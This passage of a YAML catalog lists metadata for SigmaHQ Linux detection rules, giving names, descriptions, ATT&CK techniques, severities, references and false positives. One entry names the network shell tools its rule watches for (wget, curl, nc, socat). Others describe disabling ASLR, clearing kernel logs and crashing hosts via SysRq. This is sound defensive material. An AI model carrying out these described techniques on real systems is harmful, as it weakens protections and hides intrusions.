  - Legitimate administrative activity
  - Legitimate software, cleaning hist file
  notes: ''
- detection_id: 2625cc59-0634-40d0-821e-cb67382a3dd7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/execve/lnx_auditd_susp_service_reload_or_restart.yml
  name: Service Reload or Start - Linux
  description: Detects the start, reload or restart of a service.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543.002
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1543.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1543.002/T1543.002.md
  false_positives:
  - Installation of legitimate service.
  - Legitimate reconfiguration of service.
  - Command line contains daemon-reload.
  notes: ''
- detection_id: 4cb57c2f-1f29-41f8-893d-8bed8e1c1d2f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/execve/lnx_auditd_system_shutdown_reboot.yml
  name: System Shutdown/Reboot - Linux
  description: Adversaries may shutdown/reboot systems to interrupt access to, or
    aid in the destruction of, those systems.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: informational
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1529
  tags:
  - attack.impact
  - attack.t1529
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1529/T1529.md
  false_positives:
  - Legitimate administrative activity
  notes: ''
- detection_id: edd595d7-7895-4fa7-acb3-85a18a8772ca
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/execve/lnx_auditd_unzip_hidden_zip_files_steganography.yml
  name: Steganography Unzip Hidden Information From Picture File
  description: Detects extracting of zip file from image file
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1027.003
  tags:
  - attack.defense-evasion
  - attack.t1027.003
  time_window: ''
  references:
  - https://zerotoroot.me/steganography-hiding-a-zip-in-a-jpeg-file/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9a0d8ca0-2385-4020-b6c6-cb6153ca56f3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/execve/lnx_auditd_user_discovery.yml
  name: System Owner or User Discovery - Linux
  description: 'Detects the execution of host or user discovery utilities such as
    "whoami", "hostname", "id", etc.

    Adversaries may use the information from System Owner/User Discovery during automated
    discovery to shape follow-on behaviors, including whether or not the adversary
    fully infects the target and/or attempts specific actions.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1033
  tags:
  - attack.discovery
  - attack.t1033
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1033/T1033.md
  false_positives:
  - Admin activity
  notes: ''
- detection_id: a7af2487-9c2f-42e4-9bb9-ff961f0561d5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/lnx_auditd_audio_capture.yml
  name: Audio Capture
  description: Detects attempts to record audio using the arecord and ecasound utilities.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1123
  tags:
  - attack.collection
  - attack.t1123
  time_window: ''
  references:
  - https://linux.die.net/man/1/arecord
  - https://linuxconfig.org/how-to-test-microphone-with-audio-linux-sound-architecture-alsa
  - https://manpages.debian.org/unstable/ecasound/ecasound.1.en.html
  - https://ecasound.seul.org/ecasound/Documentation/examples.html#fconversions
  false_positives:
  - Unknown
  notes: ''
- detection_id: e497a24e-9345-4a62-9803-b06d7d7cb132
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/lnx_auditd_disable_aslr_protection.yml
  name: ASLR Disabled Via Sysctl or Direct Syscall - Linux
  description: "Detects actions that disable Address Space Layout Randomization (ASLR)\
    \ in Linux, including:\n  - Use of the `personality` syscall with the ADDR_NO_RANDOMIZE\
    \ flag (0x0040000)\n  - Modification of the /proc/sys/kernel/randomize_va_space\
    \ file\n  - Execution of the `sysctl` command to set `kernel.randomize_va_space=0`\n\
    Disabling ASLR is often used by attackers during exploit development or to bypass\
    \ memory protection mechanisms.\nA successful use of these methods can reduce\
    \ the effectiveness of ASLR and make memory corruption attacks more reliable.\n"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: experimental
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1055.009
  - T1562.001
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1562.001
  - attack.t1055.009
  time_window: ''
  references:
  - https://github.com/CheraghiMilad/bypass-Neo23x0-auditd-config/blob/f1c478a37911a5447d5ffcd580f22b167bf3df14/personality-syscall/README.md
  - https://man7.org/linux/man-pages/man2/personality.2.html
  - https://manual.cs50.io/2/personality
  - https://linux-audit.com/linux-aslr-and-kernelrandomize_va_space-setting/
  false_positives:
  - Debugging or legitimate software testing
  notes: ''
- detection_id: 49aae26c-450e-448b-911d-b3c13d178dfc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/lnx_auditd_keylogging_with_pam_d.yml
  name: Linux Keylogging with Pam.d
  description: Detect attempt to enable auditing of TTY input
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1003
  - T1056.001
  tags:
  - attack.collection
  - attack.credential-access
  - attack.t1003
  - attack.t1056.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1056.001/T1056.001.md
  - https://linux.die.net/man/8/pam_tty_audit
  - https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/sec-configuring_pam_for_auditing
  - https://access.redhat.com/articles/4409591#audit-record-types-2
  false_positives:
  - Administrative work
  notes: ''
- detection_id: ca94a6db-8106-4737-9ed2-3e3bb826af0a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/lnx_auditd_password_policy_discovery.yml
  name: Password Policy Discovery - Linux
  description: Detects password policy discovery commands
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: stable
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1201
  tags:
  - attack.discovery
  - attack.t1201
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1201/T1201.md
  - https://linux.die.net/man/1/chage
  - https://man7.org/linux/man-pages/man1/passwd.1.html
  - https://superuser.com/questions/150675/how-to-display-password-policy-information-for-a-user-ubuntu
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: f7158a64-6204-4d6d-868a-6e6378b467e0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/lnx_auditd_susp_c2_commands.yml
  name: Suspicious C2 Activities
  description: 'Detects suspicious activities as declared by Florian Roth in its ''Best
    Practice Auditd Configuration''.

    This includes the detection of the following commands; wget, curl, base64, nc,
    netcat, ncat, ssh, socat, wireshark, rawshark, rdesktop, nmap.

    These commands match a few techniques from the tactics "Command and Control",
    including not exhaustively the following; Application Layer Protocol (T1071),
    Non-Application Layer Protocol (T1095), Data Encoding (T1132)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.command-and-control
  time_window: ''
  references:
  - https://github.com/Neo23x0/auditd
  false_positives:
  - Admin or User activity
  notes: ''
- detection_id: f34047d9-20d3-4e8b-8672-0a35cc50dc71
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/lnx_auditd_system_info_discovery.yml
  name: System Information Discovery - Auditd
  description: Detects System Information Discovery commands
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1082
  tags:
  - attack.discovery
  - attack.t1082
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f296668303c29d3f4c07e42bdd2b28d8dd6625f9/atomics/T1082/T1082.md
  false_positives:
  - Likely
  notes: ''
- detection_id: 977ef627-4539-4875-adf4-ed8f780c4922
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/path/lnx_auditd_auditing_config_change.yml
  name: Auditing Configuration Changes on Linux Host
  description: Detect changes in auditd configuration files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.006
  tags:
  - attack.defense-evasion
  - attack.t1562.006
  time_window: ''
  references:
  - https://github.com/Neo23x0/auditd/blob/master/audit.rules
  - Self Experience
  false_positives:
  - Legitimate administrative activity
  notes: ''
- detection_id: 808146b2-9332-4d78-9416-d7e47012d83d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/path/lnx_auditd_bpfdoor_file_accessed.yml
  name: BPFDoor Abnormal Process ID or Lock File Accessed
  description: detects BPFDoor .lock and .pid files access in temporary file storage
    facility
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  - T1106
  tags:
  - attack.execution
  - attack.t1106
  - attack.t1059
  time_window: ''
  references:
  - https://www.sandflysecurity.com/blog/bpfdoor-an-evasive-linux-backdoor-technical-analysis/
  - https://www.elastic.co/security-labs/a-peek-behind-the-bpfdoor
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 9e1bef8d-0fff-46f6-8465-9aa54e128c1e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/path/lnx_auditd_hidden_binary_execution.yml
  name: Use Of Hidden Paths Or Files
  description: Detects calls to hidden files or files located in hidden directories
    in NIX systems.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: low
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1564.001/T1564.001.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4b3cb710-5e83-4715-8c45-8b2b5b3e5751
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/path/lnx_auditd_ld_so_preload_mod.yml
  name: Modification of ld.so.preload
  description: Identifies modification of ld.so.preload for shared object injection.
    This technique is used by attackers to load arbitrary code into processes.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.006
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574.006
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1574.006/T1574.006.md
  - https://eqllib.readthedocs.io/en/latest/analytics/fd9b987a-1101-4ed3-bda6-a70300eaf57e.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: c830f15d-6f6e-430f-8074-6f73d6807841
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/path/lnx_auditd_logging_config_change.yml
  name: Logging Configuration Changes on Linux Host
  description: Detect changes of syslog daemons configuration files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.006
  tags:
  - attack.defense-evasion
  - attack.t1562.006
  time_window: ''
  references:
  - self experience
  false_positives:
  - Legitimate administrative activity
  notes: ''
- detection_id: ea61bb82-a5e0-42e6-8537-91d29500f1b9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/path/lnx_auditd_magic_system_request_key.yml
  name: Potential Abuse of Linux Magic System Request Key
  description: 'Detects the potential abuse of the Linux Magic SysRq (System Request)
    key by adversaries with root or sufficient privileges

    to silently manipulate or destabilize a system. By writing to /proc/sysrq-trigger,
    they can crash the system, kill processes,

    or disrupt forensic analysisall while bypassing standard logging. Though intended
    for recovery and debugging, SysRq can be

    misused as a stealthy post-exploitation tool. It is controlled via /proc/sys/kernel/sysrq
    or permanently through /etc/sysctl.conf.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Impact
  techniques:
  - T1059.004
  - T1489
  - T1499
  - T1529
  tags:
  - attack.execution
  - attack.t1059.004
  - attack.impact
  - attack.t1529
  - attack.t1489
  - attack.t1499
  time_window: ''
  references:
  - https://www.kernel.org/doc/html/v4.10/_sources/admin-guide/sysrq.txt
  - https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/4/html/reference_guide/s3-proc-sys-kernel
  - https://www.splunk.com/en_us/blog/security/threat-update-awfulshred-script-wiper.html
  false_positives:
  - Legitimate administrative activity
  notes: ''
- detection_id: 1f358e2e-cb63-43c3-b575-dfb072a6814f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/path/lnx_auditd_system_info_discovery2.yml
  name: System and Hardware Information Discovery
  description: Detects system information discovery commands
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: informational
  status: stable
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1082
  tags:
  - attack.discovery
  - attack.t1082
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1082/T1082.md#atomic-test-4---linux-vm-check-via-hardware
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 1bac86ba-41aa-4f62-9d6b-405eac99b485
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/path/lnx_auditd_systemd_service_creation.yml
  name: Systemd Service Creation
  description: Detects a creation of systemd services which could be used by adversaries
    to execute malicious code.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543.002
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1543.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1543.002/T1543.002.md
  false_positives:
  - Admin work like legit service installs.
  notes: ''
- detection_id: a94cdd87-6c54-4678-a6cc-2814ffe5a13d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/path/lnx_auditd_unix_shell_configuration_modification.yml
  name: Unix Shell Configuration Modification
  description: Detect unix shell configuration modification. Adversaries may establish
    persistence through executing malicious commands triggered when a new shell is
    opened.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.004
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546.004
  time_window: ''
  references:
  - https://objective-see.org/blog/blog_0x68.html
  - https://web.archive.org/web/20221204161143/https://www.glitch-cat.com/p/green-lambert-and-attack
  - https://www.anomali.com/blog/pulling-linux-rabbit-rabbot-malware-out-of-a-hat
  false_positives:
  - Admin or User activity are expected to generate some false positives
  notes: ''
- detection_id: 53059bc0-1472-438b-956a-7508a94a91f0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/service_stop/lnx_auditd_disable_system_firewall.yml
  name: Disable System Firewall
  description: Detects disabling of system firewalls which could be used by adversaries
    to bypass controls that limit usage of the network.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.004
  tags:
  - attack.t1562.004
  - attack.defense-evasion
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.004/T1562.004.md
  - https://firewalld.org/documentation/man-pages/firewall-cmd.html
  false_positives:
  - Admin activity
  notes: ''
- detection_id: eca5e022-d368-4043-98e5-9736fb01f72f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/syscall/lnx_auditd_clean_disable_dmesg_logs_via_syslog.yml
  name: Clear or Disable Kernel Ring Buffer Logs via Syslog Syscall
  description: 'Detects the use of the `syslog` syscall with action code 5 (SYSLOG_ACTION_CLEAR),

    (4 is SYSLOG_ACTION_READ_CLEAR and 6 is SYSLOG_ACTION_CONSOLE_OFF) which clears
    the kernel

    ring buffer (dmesg logs). This can be used by attackers to hide traces after exploitation

    or privilege escalation. A common technique is running `dmesg -c`, which triggers
    this syscall internally.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: experimental
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1070.002
  tags:
  - attack.defense-evasion
  - attack.t1070.002
  time_window: ''
  references:
  - https://man7.org/linux/man-pages/man2/syslog.2.html
  - https://man7.org/linux/man-pages/man1/dmesg.1.html
  false_positives:
  - System administrators or scripts that intentionally clear logs
  - Debugging scripts
  notes: ''
- detection_id: 759d0d51-bc99-4b5e-9add-8f5b2c8e7512
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/syscall/lnx_auditd_create_account.yml
  name: Creation Of An User Account
  description: Detects the creation of a new user account. Such accounts may be used
    for persistence that do not require persistent remote access tools to be deployed
    on the system.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1136.001
  tags:
  - attack.t1136.001
  - attack.persistence
  time_window: ''
  references:
  - https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/security_guide/sec-understanding_audit_log_files
  - https://access.redhat.com/articles/4409591#audit-record-types-2
  - https://www.youtube.com/watch?v=VmvY5SQm5-Y&ab_channel=M45C07
  false_positives:
  - Admin activity
  notes: ''
- detection_id: 106d7cbd-80ff-4985-b682-a7043e5acb72
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/syscall/lnx_auditd_load_module_insmod.yml
  name: Loading of Kernel Module via Insmod
  description: 'Detects loading of kernel modules with insmod command.

    Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded
    into the kernel upon demand.

    Adversaries may use LKMs to obtain persistence within the system or elevate the
    privileges.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.006
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1547.006
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.006/T1547.006.md
  - https://linux.die.net/man/8/insmod
  - https://man7.org/linux/man-pages/man8/kmod.8.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3761e026-f259-44e6-8826-719ed8079408
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/syscall/lnx_auditd_network_service_scanning.yml
  name: Linux Network Service Scanning - Auditd
  description: Detects enumeration of local or remote network services.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1046
  tags:
  - attack.discovery
  - attack.t1046
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1046/T1046.md
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 2dad0cba-c62a-4a4f-949f-5f6ecd619769
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/syscall/lnx_auditd_split_file_into_pieces.yml
  name: Split A File Into Pieces - Linux
  description: Detection use of the command "split" to split files into parts and
    possible transfer.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1030
  tags:
  - attack.exfiltration
  - attack.t1030
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1030/T1030.md
  false_positives:
  - Legitimate administrative activity
  notes: ''
- detection_id: b207d563-a1d9-4275-b349-77d1eb55aa6d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/syscall/lnx_auditd_susp_discovery_sysinfo_syscall.yml
  name: System Info Discovery via Sysinfo Syscall
  description: 'Detects use of the sysinfo system call in Linux, which provides a
    snapshot of key system statistics such as uptime, load averages, memory usage,
    and the number of running processes.

    Malware or reconnaissance tools might leverage sysinfo to fingerprint the system
    - gathering data to determine if it''s a viable target.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: experimental
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1057
  - T1082
  tags:
  - attack.discovery
  - attack.t1057
  - attack.t1082
  time_window: ''
  references:
  - https://github.com/CheraghiMilad/bypass-Neo23x0-auditd-config/blob/f1c478a37911a5447d5ffcd580f22b167bf3df14/sysinfo-syscall/README.md
  - https://man7.org/linux/man-pages/man2/sysinfo.2.html
  false_positives:
  - Legitimate administrative activity
  notes: ''
- detection_id: a39d7fa7-3fbd-4dc2-97e1-d87f546b1bbc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/syscall/lnx_auditd_susp_exe_folders.yml
  name: Program Executions in Suspicious Folders
  description: Detects program executions in suspicious non-program folders related
    to malware or hacking activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  severity: medium
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1584
  - T1587
  tags:
  - attack.t1587
  - attack.t1584
  - attack.resource-development
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Admin activity (especially in /tmp folders)
  - Crazy web applications
  notes: ''
- detection_id: 710bdbce-495d-491d-9a8f-7d0d88d2b41e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/syscall/lnx_auditd_susp_special_file_creation_via_mknod_syscall.yml
  name: Special File Creation via Mknod Syscall
  description: 'Detects usage of the `mknod` syscall to create special files (e.g.,
    character or block devices).

    Attackers or malware might use `mknod` to create fake devices, interact with kernel
    interfaces,

    or establish covert channels in Linux systems.

    Monitoring the use of `mknod` is important because this syscall is rarely used
    by legitimate applications,

    and it can be abused to bypass file system restrictions or create backdoors.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: low
  status: experimental
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543.003
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1543.003
  time_window: ''
  references:
  - https://man7.org/linux/man-pages/man2/mknod.2.html
  - https://hopeness.medium.com/master-the-linux-mknod-command-a-comprehensive-guide-1c150a546aa8
  false_positives:
  - Device creation by legitimate scripts or init systems (udevadm, MAKEDEV)
  - Container runtimes or security tools during initialization
  notes: ''
- detection_id: c0d3734d-330f-4a03-aae2-65dacc6a8222
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/syscall/lnx_auditd_web_rce.yml
  name: Webshell Remote Command Execution
  description: Detects possible command execution by web application/web shell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: critical
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1505.003
  tags:
  - attack.persistence
  - attack.t1505.003
  time_window: ''
  references:
  - Personal Experience of the Author
  - https://www.vaadata.com/blog/what-is-command-injection-exploitations-and-security-best-practices/
  false_positives:
  - Admin activity
  - Crazy web applications
  notes: ''
- detection_id: 36aa86ca-fd9d-4456-814e-d3b1b8e1e0bb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/builtin/clamav/lnx_clamav_relevant_message.yml
  name: Relevant ClamAV Message
  description: Detects relevant ClamAV messages
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: stable
  platform: linux
  product: clamav
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1588.001
  tags:
  - attack.resource-development
  - attack.t1588.001
  time_window: ''
  references:
  - https://github.com/ossec/ossec-hids/blob/1ecffb1b884607cb12e619f9ab3c04f530801083/etc/rules/clam_av_rules.xml
  false_positives:
  - Unknown
  notes: ''
- detection_id: af202fd3-7bff-4212-a25a-fb34606cfcbe
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/builtin/cron/lnx_cron_crontab_file_modification.yml
  name: Modifying Crontab
  description: Detects suspicious modification of crontab file.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: cron
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.003
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1053.003
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1053.003/T1053.003.md
  false_positives:
  - Legitimate modification of crontab
  notes: ''
- detection_id: 1edd77db-0669-4fef-9598-165bda82826d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/builtin/guacamole/lnx_guacamole_susp_guacamole.yml
  name: Guacamole Two Users Sharing Session Anomaly
  description: Detects suspicious session with two users present
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  severity: high
  status: test
  platform: linux
  product: guacamole
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1212
  tags:
  - attack.credential-access
  - attack.t1212
  time_window: ''
  references:
  - https://research.checkpoint.com/2020/apache-guacamole-rce/
  false_positives:
  - Unknown
  notes: ''
